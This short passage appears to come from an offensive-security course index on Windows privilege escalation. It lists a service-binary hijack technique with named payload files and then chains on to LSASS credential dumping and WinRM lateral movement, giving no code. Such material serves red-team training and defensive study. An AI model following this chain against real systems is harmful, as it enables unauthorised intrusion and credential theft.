| Writable service binary / ImagePath | Service binary hijack + registry backup rollback | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |

After elevate: record the new integrity with `whoami /groups` → credentials if needed: [07-credentials-lsass](/modules/07-credentials-lsass) → lateral: [15-winrm-lateral](/modules/15-winrm-lateral).
